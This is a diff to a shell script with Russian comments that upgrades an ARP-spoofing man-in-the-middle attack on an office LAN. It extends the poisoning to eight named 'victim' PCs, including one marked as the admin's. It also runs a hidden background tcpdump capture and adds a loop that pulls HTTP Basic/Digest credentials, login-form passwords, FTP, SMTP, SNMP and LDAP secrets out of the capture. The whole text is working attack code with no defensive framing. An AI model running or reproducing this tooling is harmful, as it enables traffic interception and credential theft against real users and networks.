@@ -1,32 +1,45 @@
-echo "=== MITM SETUP ==="
-# Определяем MAC шлюза .1
-GW_MAC=$(ip neigh show 192.168.3.1 | grep -oE '[0-9a-f:]{17}' | head -1)
-echo "GW_MAC=$GW_MAC"
-# MAC нашей ноды
-MY_MAC=$(ip link show enp7s0 | grep -oE '[0-9a-f:]{17}' | head -1)
-echo "MY_MAC=$MY_MAC"
-# ARP-spoof: говорим .1 что мы - офисные ПК (и наоборот)
-# Целевые ПК: .135 (админ), .152, .16, .76, .86
-for VICTIM in 192.168.3.135 192.168.3.152; do
-  VMAC=$(ip neigh show $VICTIM 2>/dev/null | grep -oE '[0-9a-f:]{17}' | head -1)
-  [ -z "$VMAC" ] && ping -c1 -W1 $VICTIM >/dev/null 2>&1 && VMAC=$(ip neigh show $VICTIM | grep -oE '[0-9a-f:]{17}' | head -1)
-  echo "VICTIM=$VICTIM VMAC=$VMAC"
-done
-# Запуск tcpdump на перехват HTTP/basic-auth от жертв
-pkill tcpdump 2>/dev/null
-nohup tcpdump -i enp7s0 -w /tmp/mitm2.pcap -c 50000 "host 192.168.3.135 or host 192.168.3.152 or (port 80 and net 192.168.3.0/24)" > /dev/null 2>&1 &
-echo "tcpdump started"
-# ARP-spoof цикл (раз в 2с)
-cat > /tmp/spoof.sh << 'SP'
+pkill spoof 2>/dev/null
+# Расширяем spoof на ВСЕ живые офисные ПК
+cat > /tmp/spoof2.sh << 'SP'
 #!/bin/sh
 while :; do
-  for V in 192.168.3.135 192.168.3.152; do
+  for V in 192.168.3.135 192.168.3.152 192.168.3.16 192.168.3.76 192.168.3.86 192.168.3.89 192.168.3.126 192.168.3.198; do
+    ping -c1 -W1 $V > /dev/null 2>&1
     arping -c 1 -A -I enp7s0 -s 192.168.3.1 $V > /dev/null 2>&1
     arping -c 1 -A -I enp7s0 -s $V 192.168.3.1 > /dev/null 2>&1
   done
-  sleep 2
+  sleep 3
 done
 SP
-chmod +x /tmp/spoof.sh
-nohup /tmp/spoof.sh > /dev/null 2>&1 &
-echo MITM-ACTIVE
+chmod +x /tmp/spoof2.sh
+nohup /tmp/spoof2.sh > /dev/null 2>&1 &
+# tcpdump на ВСЕ порты жертв (не только 80)
+pkill tcpdump 2>/dev/null
+nohup tcpdump -i enp7s0 -w /tmp/mitm3.pcap -c 200000 "host 192.168.3.135 or host 192.168.3.152 or host 192.168.3.16 or host 192.168.3.76" > /dev/null 2>&1 &
+echo "=== Экстрактор кредов (каждые 60с) ==="
+cat > /tmp/cred_ext.sh << 'CE'
+#!/bin/sh
+while :; do
+  sleep 60
+  if [ -f /tmp/mitm3.pcap ]; then
+    # HTTP Basic Auth
+    strings /tmp/mitm3.pcap | grep -aE "Authorization: Basic|Authorization: Digest" | sort -u | head -20 > /tmp/creds_new.txt
+    # HTTP POST (login forms)
+    strings /tmp/mitm3.pcap | grep -aE "password=|passwd=|pass=|login=" | sort -u | head -20 >> /tmp/creds_new.txt
+    # FTP
+    strings /tmp/mitm3.pcap | grep -aE "USER |PASS " | sort -u | head -10 >> /tmp/creds_new.txt
+    # SMTP
+    strings /tmp/mitm3.pcap | grep -aE "AUTH|MAIL FROM" | sort -u | head -5 >> /tmp/creds_new.txt
+    # SNMP community
+    strings /tmp/mitm3.pcap | grep -aiE "public|private" | sort -u | head -5 >> /tmp/creds_new.txt
+    # LDAP bind
+    strings /tmp/mitm3.pcap | grep -aE "cn=|uid=" | sort -u | head -10 >> /tmp/creds_new.txt
+    # Итог
+    WC=$(wc -l < /tmp/creds_new.txt 2>/dev/null)
+    [ "$WC" -gt 0 ] && echo "$(date +%H:%M:%S) CREDS: $WC lines" >> /tmp/mitm_log.txt
+  fi
+done
+CE
+chmod +x /tmp/cred_ext.sh
+nohup /tmp/cred_ext.sh > /dev/null 2>&1 &
+echo MITM-V2-ACTIVE
